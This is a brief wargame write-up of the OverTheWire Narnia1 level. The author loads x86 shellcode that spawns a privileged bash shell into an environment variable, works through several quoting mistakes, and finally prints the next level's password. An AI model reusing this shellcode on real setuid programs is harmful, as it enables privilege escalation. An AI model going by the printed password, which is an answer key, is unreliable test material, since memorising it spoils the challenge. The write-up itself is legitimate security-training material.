# Narnia1 (OverTheWire)

immediately look at the source code and see that it wants us to put something executable in the enviroment variable EGG

use printenv and see that EGG doesn't exist

first tried to set EGG to /bin/bash with EGG='/bin/bash' and export EGG, but program seg faults. 

so it's not executing correctly. let's try some shell code instead

EGG = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

export EGG

still seg faults. turns out it only thinks it's executable if there's a $ in the front.

EGG = $"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

export EGG

still wrong. a last ditch attempt: 

EGG = $'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'

export EGG

it worked! whoami results in narnia2. cd into /etc/narnia_pass and cat narnia2 to the get the narnia2 password: nairiepecu
